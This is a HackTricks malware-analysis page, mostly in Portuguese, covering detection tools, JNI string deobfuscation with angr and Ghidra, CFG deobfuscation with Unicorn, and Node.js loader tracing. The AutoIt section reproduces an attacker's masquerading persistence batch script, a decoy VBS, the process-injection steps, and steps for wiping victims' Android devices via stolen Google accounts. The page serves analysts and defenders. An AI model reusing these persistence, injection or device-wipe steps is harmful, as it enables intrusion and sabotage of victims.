# Análise de Malware

{{#include ../../banners/hacktricks-training.md}}

## Folhas de Consulta de Forense

[https://www.jaiminton.com/cheatsheet/DFIR/#](https://www.jaiminton.com/cheatsheet/DFIR/)

## Serviços Online

- [VirusTotal](https://www.virustotal.com/gui/home/upload)
- [HybridAnalysis](https://www.hybrid-analysis.com)
- [Koodous](https://koodous.com)
- [Intezer](https://analyze.intezer.com)
- [Any.Run](https://any.run/)

## Ferramentas de Antivírus e Detecção Offline

### Yara

#### Instalação
```bash
sudo apt-get install -y yara
```
#### Preparar regras

Use este script para baixar e mesclar todas as yara malware rules do github: [https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9](https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9)\
Crie o diretório _**rules**_ e execute-o. Isso criará um arquivo chamado _**malware_rules.yar**_ que contém todas as yara rules para malware.
```bash
wget https://gist.githubusercontent.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9/raw/4ec711d37f1b428b63bed1f786b26a0654aa2f31/malware_yara_rules.py
mkdir rules
python malware_yara_rules.py
```
#### Varredura
```bash
yara -w malware_rules.yar image  #Scan 1 file
yara -w malware_rules.yar folder #Scan the whole folder
```
#### YaraGen: Verificar malware e criar regras

Você pode usar a ferramenta [**YaraGen**](https://github.com/Neo23x0/yarGen) para gerar yara rules a partir de um binário. Confira estes tutoriais: [**Part 1**](https://www.nextron-systems.com/2015/02/16/write-simple-sound-yara-rules/), [**Part 2**](https://www.nextron-systems.com/2015/10/17/how-to-write-simple-but-sound-yara-rules-part-2/), [**Part 3**](https://www.nextron-systems.com/2016/04/15/how-to-write-simple-but-sound-yara-rules-part-3/)
```bash
python3 yarGen.py --update
python3.exe yarGen.py --excludegood -m  ../../mals/
```
### ClamAV

#### Instalação
```
sudo apt-get install -y clamav
```
#### Varredura
```bash
sudo freshclam      #Update rules
clamscan filepath   #Scan 1 file
clamscan folderpath #Scan the whole folder
```
### [Capa](https://github.com/mandiant/capa)

**Capa** detecta potenciais **capacidades** maliciosas em executáveis: PE, ELF, .NET. Assim, ele encontrará coisas como Att\&ck tactics, ou capacidades suspeitas tais como:

- verificar erro do OutputDebugString
- executar como serviço
- criar processo

Obtenha-o no [**Github repo**](https://github.com/mandiant/capa).

### IOCs

IOC significa Indicador de Comprometimento. Um IOC é um conjunto de **condições que identificam** algum software potencialmente indesejado ou **malware** confirmado. Blue Teams usam esse tipo de definição para **procurar esse tipo de arquivos maliciosos** em seus **sistemas** e **redes**.\
Compartilhar essas definições é muito útil, pois quando o malware é identificado em um computador e um IOC para esse malware é criado, outras Blue Teams podem usá-lo para identificar o malware mais rapidamente.

Uma ferramenta para criar ou modificar IOCs é [**IOC Editor**](https://www.fireeye.com/services/freeware/ioc-editor.html)**.**\
Você pode usar ferramentas como [**Redline**](https://www.fireeye.com/services/freeware/redline.html) para **procurar IOCs definidos em um dispositivo**.

### Loki

[**Loki**](https://github.com/Neo23x0/Loki) é um scanner para Indicadores Simples de Comprometimento.\
A detecção baseia-se em quatro métodos de detecção:
```
1. File Name IOC
Regex match on full file path/name

2. Yara Rule Check
Yara signature matches on file data and process memory

3. Hash Check
Compares known malicious hashes (MD5, SHA1, SHA256) with scanned files

4. C2 Back Connect Check
Compares process connection endpoints with C2 IOCs (new since version v.10)
```
### Linux Malware Detect

[**Linux Malware Detect (LMD)**](https://www.rfxn.com/projects/linux-malware-detect/) é um scanner de malware para Linux lançado sob a licença GNU GPLv2, projetado para as ameaças enfrentadas em ambientes de hospedagem compartilhada. Ele usa dados de ameaças de sistemas de detecção de intrusão na borda da rede para extrair malware que está sendo usado ativamente em ataques e gera assinaturas para detecção. Além disso, os dados de ameaças também são derivados de submissões de usuários com o recurso de checkout do LMD e de recursos da comunidade de malware.

### rkhunter

Ferramentas como [**rkhunter**](http://rkhunter.sourceforge.net) podem ser usadas para verificar o sistema de arquivos em busca de possíveis **rootkits** e malware.
```bash
sudo ./rkhunter --check -r / -l /tmp/rkhunter.log [--report-warnings-only] [--skip-keypress]
```
### FLOSS

[**FLOSS**](https://github.com/mandiant/flare-floss) é uma ferramenta que tentará encontrar obfuscated strings dentro de executáveis usando diferentes técnicas.

### PEpper

[PEpper ](https://github.com/Th3Hurrican3/PEpper)checa algumas coisas básicas dentro do executável (binary data, entropy, URLs and IPs, some yara rules).

### PEstudio

[PEstudio](https://www.winitor.com/download) é uma ferramenta que permite obter informações de executáveis Windows tais como imports, exports, headers, mas também vai checar virus total e encontrar potenciais Att\&ck techniques.

### Detect It Easy(DiE)

[**DiE**](https://github.com/horsicq/Detect-It-Easy/) é uma ferramenta para detectar se um arquivo está **encrypted** e também encontrar **packers**.

### NeoPI

[**NeoPI** ](https://github.com/CiscoCXSecurity/NeoPI)is um script Python que usa uma variedade de **métodos estatísticos** para detectar conteúdo **obfuscated** e **encrypted** dentro de arquivos de texto/script. O propósito pretendido do NeoPI é auxiliar na **detecção de código de web shell oculto**.

### **php-malware-finder**

[**PHP-malware-finder**](https://github.com/nbs-system/php-malware-finder) faz o máximo para detectar **obfuscated**/**dodgy code** assim como arquivos que usam funções **PHP** frequentemente usadas em **malwares**/webshells.

### Apple Binary Signatures

Ao verificar alguma **malware sample** você deve sempre **check the signature** do binário, pois o **developer** que o assinou pode já estar **related** com **malware.**
```bash
#Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

#Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

#Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app
```
## Técnicas de Detecção

### File Stacking

Se você sabe que alguma pasta contendo os **arquivos** de um **servidor web** foi **atualizada pela última vez em certa data**. **Verifique** a **data** em que todos os **arquivos** no **servidor web** foram criados e modificados e, se alguma data for **suspeita**, verifique esse arquivo.

### Baselines

Se os arquivos de uma pasta **não deveriam ter sido modificados**, você pode calcular o **hash** dos **arquivos originais** da pasta e **compará-los** com os atuais. Qualquer coisa modificada será **suspeita**.

### Statistical Analysis

Quando a informação é salva em logs, você pode **verificar estatísticas, como quantas vezes cada arquivo de um servidor web foi acessado, pois um web shell pode ser um dos mais acessados**.

---

### Android in-app native telemetry (no root)

No Android, você pode instrumentar código nativo dentro do processo do app alvo pré-carregando uma pequena biblioteca logger antes que outras libs JNI sejam inicializadas. Isso dá visibilidade precoce do comportamento nativo sem hooks em todo o sistema ou root. Uma abordagem popular é SoTap: coloque libsotap.so para o ABI correto dentro do APK e injete uma chamada System.loadLibrary("sotap") cedo (por exemplo, inicializador estático ou Application.onCreate), então colete logs de caminhos internos/externos ou use Logcat como fallback.

Veja a página de reversing nativo do Android para detalhes de configuração e caminhos de logs:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/reversing-native-libraries.md
{{#endref}}

---

### Android/JNI native string deobfuscation with angr + Ghidra

Alguns malwares Android e apps protegidos por RASP escondem nomes e assinaturas de métodos JNI decodificando-os em runtime antes de chamar RegisterNatives. Quando a instrumentação com Frida/ptrace é encerrada por anti-debug, você ainda pode recuperar o plaintext offline executando o decodificador dentro do binário com angr e então inserindo os resultados de volta no Ghidra como comentários.

Ideia chave: trate o decodificador dentro do .so como uma função chamável, execute-o nos blobs de bytes ofuscados em .rodata e concretize os bytes de saída até o primeiro \x00 (C-string terminator). Mantenha angr e Ghidra usando a mesma image base para evitar incompatibilidades de endereços.

Workflow overview
- Triagem no Ghidra: identifique o decodificador e sua convenção de chamada/argumentos em JNI_OnLoad e na configuração de RegisterNatives.
- Execute angr (CPython3) para rodar o decodificador para cada string alvo e exportar os resultados.
- Anotar no Ghidra: comente automaticamente as strings decodificadas em cada ponto de chamada para rápida reconstrução JNI.

Ghidra triage (JNI_OnLoad pattern)
- Aplique os datatypes JNI em JNI_OnLoad para que o Ghidra reconheça estruturas JNINativeMethod.
- Typical JNINativeMethod per Oracle docs:

```c
typedef struct {
char *name;      // e.g., "nativeFoo"
char *signature; // e.g., "()V", "()[B"
void *fnPtr;     // native implementation address
} JNINativeMethod;
```
- Procure por chamadas a RegisterNatives. Se a biblioteca constrói o nome/assinatura com uma rotina local (e.g., FUN_00100e10) que referencia uma tabela de bytes estática (e.g., DAT_00100bf4) e recebe parâmetros como (encoded_ptr, out_buf, length), esse é um alvo ideal para execução offline.

angr setup (execute the decoder offline)
- Carregue o .so com a mesma base usada no Ghidra (exemplo: 0x00100000) e desative o carregamento automático de libs externas para manter o estado pequeno.

<details>
<summary>configuração do angr e execução offline do decodificador</summary>
```python
import angr, json

project = angr.Project(
'/path/to/libtarget.so',
load_options={'main_opts': {'base_addr': 0x00100000}},
auto_load_libs=False,
)

ENCODING_FUNC_ADDR = 0x00100e10  # decoder function discovered in Ghidra

def decode_string(enc_addr, length):
# fresh blank state per evaluation
st = project.factory.blank_state()
outbuf = st.heap.allocate(length)
call = project.factory.callable(ENCODING_FUNC_ADDR, base_state=st)
ret_ptr = call(enc_addr, outbuf, length)  # returns outbuf pointer
rs = call.result_state
raw = rs.solver.eval(rs.memory.load(ret_ptr, length), cast_to=bytes)
return raw.split(b'\x00', 1)[0].decode('utf-8', errors='ignore')

# Example: decode a JNI signature at 0x100933 of length 5 → should be ()[B
print(decode_string(0x00100933, 5))
```
</details>

- Em larga escala, construa um mapa estático de call sites para os argumentos do decoder (encoded_ptr, size). Wrappers podem ocultar os argumentos, então você pode criar esse mapeamento manualmente a partir de Ghidra xrefs se a recuperação da API estiver ruidosa.

<details>
<summary>Decodificação em lote de múltiplos call sites com angr</summary>
```python
# call_site -> (encoded_addr, size)
call_site_args_map = {
0x00100f8c: (0x00100b81, 0x41),
0x00100fa8: (0x00100bca, 0x04),
0x00100fcc: (0x001007a0, 0x41),
0x00100fe8: (0x00100933, 0x05),
0x0010100c: (0x00100c62, 0x41),
0x00101028: (0x00100c15, 0x16),
0x00101050: (0x00100a49, 0x101),
0x00100cf4: (0x00100821, 0x11),
0x00101170: (0x00100940, 0x101),
0x001011cc: (0x0010084e, 0x13),
0x00101334: (0x001007e9, 0x0f),
0x00101478: (0x0010087d, 0x15),
0x001014f8: (0x00100800, 0x19),
0x001015e8: (0x001008e6, 0x27),
0x0010160c: (0x00100c33, 0x13),
}

decoded_map = { hex(cs): decode_string(enc, sz)
for cs, (enc, sz) in call_site_args_map.items() }

import json
print(json.dumps(decoded_map, indent=2))
with open('decoded_strings.json', 'w') as f:
json.dump(decoded_map, f, indent=2)
```
</details>

Anotar locais de chamada no Ghidra
Opção A: escritor de comentários somente Jython (use um JSON pré-calculado)
- Como angr requer CPython3, mantenha desofuscação e anotação separadas. Primeiro execute o script angr acima para produzir decoded_strings.json. Depois execute este GhidraScript em Jython para escrever PRE_COMMENTs em cada local de chamada (e incluir o nome da função chamadora para contexto):

<details>
<summary>Script Jython do Ghidra para anotar strings JNI decodificadas</summary>
```python
#@category Android/Deobfuscation
# Jython in Ghidra 10/11
import json
from ghidra.program.model.listing import CodeUnit

# Ask for the JSON produced by the angr script
f = askFile('Select decoded_strings.json', 'Load')
mapping = json.load(open(f.absolutePath, 'r'))  # keys as hex strings

fm = currentProgram.getFunctionManager()
rm = currentProgram.getReferenceManager()

# Replace with your decoder address to locate call-xrefs (optional)
ENCODING_FUNC_ADDR = 0x00100e10
enc_addr = toAddr(ENCODING_FUNC_ADDR)

callsite_to_fn = {}
for ref in rm.getReferencesTo(enc_addr):
if ref.getReferenceType().isCall():
from_addr = ref.getFromAddress()
fn = fm.getFunctionContaining(from_addr)
if fn:
callsite_to_fn[from_addr.getOffset()] = fn.getName()

# Write comments from JSON
for k_hex, s in mapping.items():
cs = int(k_hex, 16)
site = toAddr(cs)
caller = callsite_to_fn.get(cs, None)
text = s if caller is None else '%s @ %s' % (s, caller)
currentProgram.getListing().setComment(site, CodeUnit.PRE_COMMENT, text)
print('[+] Annotated %d call sites' % len(mapping))
```
</details>

Opção B: script CPython único via pyhidra/ghidra_bridge
- Alternativamente, use pyhidra ou ghidra_bridge para controlar a API do Ghidra a partir do mesmo processo CPython que executa angr. Isso permite chamar decode_string() e definir PRE_COMMENTs imediatamente sem um ficheiro intermediário. A lógica espelha o script Jython: construa um mapa callsite→function via ReferenceManager, decodifique com angr e defina comentários.

Por que isso funciona e quando usar
- A execução offline evita RASP/anti-debug: sem ptrace, sem hooks do Frida necessários para recuperar strings.
- Manter os base_addr do Ghidra e do angr alinhados (por exemplo, 0x00100000) garante que os endereços de funções/dados coincidam entre as ferramentas.
- Receita repetível para decoders: trate a transformação como uma função pura, aloque um buffer de saída em um estado limpo, chame-a com (encoded_ptr, out_ptr, len), depois concretize via state.solver.eval e parseie C-strings até \x00.

Observações e armadilhas
- Respeite o ABI/convencão de chamada do alvo. angr.factory.callable seleciona uma com base na arch; se os argumentos parecerem deslocados, especifique cc explicitamente.
- Se o decoder espera buffers de saída zerados, inicialize outbuf com zeros no estado antes da chamada.
- Para um .so Android independente de posição, sempre forneça base_addr para que os endereços em angr correspondam aos vistos no Ghidra.
- Use currentProgram.getReferenceManager() para enumerar call-xrefs mesmo que o app envolva o decoder atrás de stubs finos.

Para o básico do angr, veja: [angr basics](../../reversing/reversing-tools-basic-methods/angr/README.md)

---

## Desofuscação de Dynamic Control-Flow (JMP/CALL RAX Dispatchers)

Familias de malware modernas abusam fortemente de Control-Flow Graph (CFG) obfuscation: em vez de um jump/call direto elas calculam o destino em tempo de execução e executam `jmp rax` ou `call rax`. Um pequeno *dispatcher* (tipicamente nove instruções) define o alvo final dependendo das flags da CPU `ZF`/`CF`, quebrando completamente a recuperação estática do CFG.

A técnica — demonstrada pelo loader SLOW#TEMPEST — pode ser derrotada com um fluxo de trabalho em três passos que depende apenas do IDAPython e do emulador de CPU Unicorn.

### 1. Localize cada jump/call indireto
```python
import idautils, idc

for ea in idautils.FunctionItems(idc.here()):
mnem = idc.print_insn_mnem(ea)
if mnem in ("jmp", "call") and idc.print_operand(ea, 0) == "rax":
print(f"[+] Dispatcher found @ {ea:X}")
```
### 2. Extraia o byte-code do dispatcher
```python
import idc

def get_dispatcher_start(jmp_ea, count=9):
s = jmp_ea
for _ in range(count):
s = idc.prev_head(s, 0)
return s

start = get_dispatcher_start(jmp_ea)
size  = jmp_ea + idc.get_item_size(jmp_ea) - start
code  = idc.get_bytes(start, size)
open(f"{start:X}.bin", "wb").write(code)
```
### 3. Emule-o duas vezes com Unicorn
```python
from unicorn import *
from unicorn.x86_const import *
import struct

def run(code, zf=0, cf=0):
BASE = 0x1000
mu = Uc(UC_ARCH_X86, UC_MODE_64)
mu.mem_map(BASE, 0x1000)
mu.mem_write(BASE, code)
mu.reg_write(UC_X86_REG_RFLAGS, (zf << 6) | cf)
mu.reg_write(UC_X86_REG_RAX, 0)
mu.emu_start(BASE, BASE+len(code))
return mu.reg_read(UC_X86_REG_RAX)
```
Execute `run(code,0,0)` e `run(code,1,1)` para obter os alvos das ramificações *false* e *true*.

### 4. Restaurar um direct jump / call
```python
import struct, ida_bytes

def patch_direct(ea, target, is_call=False):
op   = 0xE8 if is_call else 0xE9           # CALL rel32 or JMP rel32
disp = target - (ea + 5) & 0xFFFFFFFF
ida_bytes.patch_bytes(ea, bytes([op]) + struct.pack('<I', disp))
```
Depois de aplicar o patch, force o IDA a reanalisar a função para que o CFG completo e a saída do Hex-Rays sejam restaurados:
```python
import ida_auto, idaapi
idaapi.reanalyze_function(idc.get_func_attr(ea, idc.FUNCATTR_START))
```
### 5. Rotular chamadas de API indiretas

Uma vez que o destino real de cada `call rax` seja conhecido, você pode informar ao IDA o que é, para que os tipos de parâmetro & os nomes das variáveis sejam recuperados automaticamente:
```python
idc.set_callee_name(call_ea, resolved_addr, 0)  # IDA 8.3+
```
### Benefícios práticos

* Restaura o real CFG → a descompilação passa de *10* linhas para milhares.
* Habilita string-cross-reference & xrefs, tornando a reconstrução do comportamento trivial.
* Scripts são reutilizáveis: coloque-os em qualquer loader protegido pelo mesmo truque.

---

## Loaders baseados em AutoIt: .a3x decryption, Task Scheduler masquerade and RAT injection

Este padrão de intrusão encadeia um MSI assinado, AutoIt loaders compilados para .a3x, e um job do Task Scheduler mascarando-se como um app benigno.

### MSI → ações personalizadas → AutoIt orchestrator

Árvore de processos e comandos executados pelas ações personalizadas do MSI:

- MsiExec.exe → cmd.exe para executar install.bat
- WScript.exe para exibir um diálogo de erro de isca
```cmd
%SystemRoot%\system32\cmd.exe /c %APPDATA%\스트레스 클리어\install.bat
%SystemRoot%\System32\WScript.exe %APPDATA%\스트레스 클리어\error.vbs
```
install.bat (drops loader, sets persistence, self-cleans):
```bat
@echo off
set dr=Music

copy "%~dp0AutoIt3.exe" %public%\%dr%\AutoIt3.exe
copy "%~dp0IoKlTr.au3" %public%\%dr%\IoKlTr.au3

cd /d %public%\%dr% & copy c:\windows\system32\schtasks.exe hwpviewer.exe ^
& hwpviewer /delete /tn "IoKlTr" /f ^
& hwpviewer /create /sc minute /mo 1 /tn "IoKlTr" /tr "%public%\%dr%\AutoIt3.exe %public%\%dr%\IoKlTr.au3"

del /f /q "%~dp0AutoIt3.exe"
del /f /q "%~dp0IoKlTr.au3"
del /f /q "%~f0"
```
error.vbs (isca para o usuário):
```vb
MsgBox "현재 시스템 언어팩과 프로그램 언어팩이 호환되지 않아 실행할 수 없습니다." & vbCrLf & _
"설정에서 한국어(대한민국) 언어팩을 설치하거나 변경한 뒤 다시 실행해 주세요.", _
vbCritical, "언어팩 오류"
```
Key artifacts and masquerade:
- Deposita AutoIt3.exe e IoKlTr.au3 em C:\Users\Public\Music
- Copia schtasks.exe para hwpviewer.exe (mascara-se como Hangul Word Processor viewer)
- Cria uma scheduled task "IoKlTr" que roda a cada 1 minuto
- Startup LNK visto como Smart_Web.lnk; mutex: `Global\AB732E15-D8DD-87A1-7464-CE6698819E701`
- Coloca módulos em subpastas de %APPDATA%\Google\Browser\ contendo `adb` ou `adv` e os inicia via helpers autoit.vbs/install.bat

Forensic triage tips:
- schtasks enumeration: `schtasks /query /fo LIST /v | findstr /i "IoKlTr hwpviewer"`
- Procure por cópias renomeadas de schtasks.exe co-localizadas com o Task XML: `dir /a "C:\Users\Public\Music\hwpviewer.exe"`
- Caminhos comuns: `C:\Users\Public\Music\AutoIt3.exe`, `...\IoKlTr.au3`, Startup `Smart_Web.lnk`, `%APPDATA%\Google\Browser\(adb|adv)*`
- Correlacione criação de processos: AutoIt3.exe gerando binários legítimos do Windows (por exemplo, cleanmgr.exe, hncfinder.exe)

### AutoIt loaders and .a3x payload decryption → injection

- Módulos AutoIt são compilados com `#AutoIt3Wrapper_Outfile_type=a3x` e descriptografam payloads incorporados antes de injetar em processos benignos.
- Famílias observadas: QuasarRAT (injetado em hncfinder.exe) e RftRAT/RFTServer (injetado em cleanmgr.exe), além de módulos RemcosRAT (`Remcos\RunBinary.a3x`).
- Padrão de descriptografia: deriva uma chave AES via HMAC, descriptografa o blob incorporado e então injeta o módulo em plaintext.

Generic decryption skeleton (exact HMAC input/algorithm is family-specific):
```python
import hmac, hashlib
from Crypto.Cipher import AES

def derive_aes_key(secret: bytes, data: bytes) -> bytes:
# Example: HMAC-SHA256 → first 16/32 bytes as AES key
return hmac.new(secret, data, hashlib.sha256).digest()

def aes_decrypt_cbc(key: bytes, iv: bytes, ct: bytes) -> bytes:
return AES.new(key, AES.MODE_CBC, iv=iv).decrypt(ct)
```
Fluxo comum de injection (estilo CreateRemoteThread):
- CreateProcess (suspended) do processo alvo (ex.: cleanmgr.exe)
- VirtualAllocEx + WriteProcessMemory com módulo/shellcode descriptografado
- CreateRemoteThread ou QueueUserAPC para executar o payload

Hunting ideas
- AutoIt3.exe iniciado por MsiExec.exe ou WScript.exe que lança utilitários do sistema
- Arquivos com extensão `.a3x` ou AutoIt script runners em caminhos públicos/graváveis pelo usuário
- Scheduled tasks suspeitas executando AutoIt3.exe ou binários não assinados pela Microsoft, com gatilhos em nível de minutos

### Account-takeover abuse of Android Find My Device (Find Hub)

Durante a intrusão no Windows, operadores usaram credenciais Google roubadas para resetar repetidamente os dispositivos Android da vítima, suprimindo notificações enquanto ampliavam o acesso via o desktop messenger da vítima que estava logado.

Operator steps (from a logged-in browser session):
- Review Google Account → Security → Your devices; follow Find My Phone → Find Hub (https://www.google.com/android/find)
- Select device → re-enter Google password → issue "Erase device" (factory reset); repeat to delay recovery
- Optional: clear alert e-mails in the linked mailbox (e.g., Naver) to hide security notifications

## Tracing heavily obfuscated Node.js loaders

Attackers increasingly bundle JavaScript loaders inside standalone Windows binaries compiled with [`nexe`](https://github.com/nexe/nexe), so the runtime ships together with the script. The resulting PE often weighs 60–90 MB and executes even if Node.js is not installed. During triage:

- Use [`nexe_unpacker`](https://npm.io/package/nexe_unpacker) to carve the embedded JavaScript out of the PE and feed it to local tooling for static diffing.
- Expect a disk-based mutex in `%TEMP%` (GachiLoader drops a random `<name>.lock` file that expires after ~5 minutes). Copying the file to the sandbox before execution lets you skip redundant stages while still seeing later payloads.

### Node.js API tracing to defeat anti-analysis

Check Point’s [Nodejs-Tracer](https://github.com/CheckPointSW/Nodejs-Tracer) hooks core modules inside any Node.js process, lets you spoof anti-VM probes, and preserves every artifact the sample writes. Launch obfuscated scripts through the tracer to keep analyst-controlled instrumentation in the call stack:
```powershell
node -r .\tracer.js main.js
```
Chaves de configuração principais dentro de `tracer.js` permitem que você:

- Log filesystem, child-process, and HTTP activity (`LOG_HTTP_REQUESTS`, `SAVE_FILE_WRITES`). Every dropped file—such as `kidkadi.node`—is copied to the working directory before the malware deletes it.
- Override environment fingerprints by returning realistic RAM/CPU counts, faking `tasklist` output, and tampering with PowerShell/WMI responses. This bypasses loaders that demand ≥4 GB RAM, ≥2 cores, and scrutinize user names (`mashinesssss`, `wdagutilityaccount`, etc.), hostnames (`desktop-vrsqlag`, `server1` …), and process names (`vmtoolsd.exe`, `fiddler.exe`, `x64dbg.exe`, `frida-server.exe`).
- Neuter WMI hardware checks like `Get-WmiObject Win32_DiskDrive` (looking for `vmware`, `kvm`, `virtio`, …), `Win32_VideoController` (blocking “VirtualBox Graphics Adapter”, “Hyper-V Video”, etc.) and `Win32_PortConnector` counts. When those probes report “real” hardware, sandboxes no longer hit the infinite loop of benign `Invoke-WebRequest` calls to `linkedin.com`, `grok.com`, `whatsapp.com`, and similar domains that GachiLoader uses to waste analysis time.

### Capturing gated C2 traffic automatically

The tracer’s network hooks reveal multi-layer C2 authentication without reversing the JavaScript obfuscation. In the observed campaign the loader:

1. POSTs host telemetry to `/log` on each hard-coded C2.
2. Issues `GET /richfamily/<per-sample key>` with `X-Secret: gachifamily` to retrieve a Base64-encoded payload URL.
3. Performs a final `GET` to that URL with a long per-sample `X-Secret` header; missing it returns `403 Forbidden`.

Because the tracer records complete requests (headers, bodies, destinations), you can replay the same traffic to pull payloads, dump Themida/VMProtect shells in memory, and extract Rhadamanthys configuration data at scale.

## AdaptixC2: Configuration Extraction and TTPs

Veja a página dedicada:

{{#ref}}
adaptixc2-config-extraction-and-ttps.md
{{#endref}}

## References

- [Unit42 – Evolving Tactics of SLOW#TEMPEST: A Deep Dive Into Advanced Malware Techniques](https://unit42.paloaltonetworks.com/slow-tempest-malware-obfuscation/)
- SoTap: Lightweight in-app JNI (.so) behavior logger – [github.com/RezaArbabBot/SoTap](https://github.com/RezaArbabBot/SoTap)
- Strategies for Analyzing Native Code in Android Applications: Combining Ghidra and Symbolic Execution for Code Decryption and Deobfuscation – [revflash.medium.com](https://revflash.medium.com/strategies-for-analyzing-native-code-in-android-applications-combining-ghidra-and-symbolic-aaef4c9555df)
- Ghidra – [github.com/NationalSecurityAgency/ghidra](https://github.com/NationalSecurityAgency/ghidra)
- angr – [angr.io](https://angr.io/)
- JNI_OnLoad and invocation API – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/invocation.html#JNJI_OnLoad)
- RegisterNatives – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/functions.html#RegisterNatives)
- Tracing JNI Functions – [valsamaras.medium.com](https://valsamaras.medium.com/tracing-jni-functions-75b04bee7c58)
- Native Enrich: Scripting Ghidra and Frida to discover hidden JNI functions – [laripping.com](https://laripping.com/blog-posts/2021/12/20/nativeenrich.html)
- [Unit42 – AdaptixC2: A New Open-Source Framework Leveraged in Real-World Attacks](https://unit42.paloaltonetworks.com/adaptixc2-post-exploitation-framework/)
- KONNI-linked APT abuses Google Find Hub to wipe Android devices after Windows intrusion – [genians.co.kr](https://www.genians.co.kr/en/blog/threat_intelligence/android)
- Android Find My Device (Find Hub) – [google.com/android/find](https://www.google.com/android/find)
- RftRAT/RFTServer technical analysis – [asec.ahnlab.com](https://asec.ahnlab.com/en/59590/)
- HMAC background – [wikipedia.org/wiki/HMAC](https://en.wikipedia.org/wiki/HMAC)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Nodejs-Tracer – GitHub](https://github.com/CheckPointSW/Nodejs-Tracer)

{{#include ../../banners/hacktricks-training.md}}
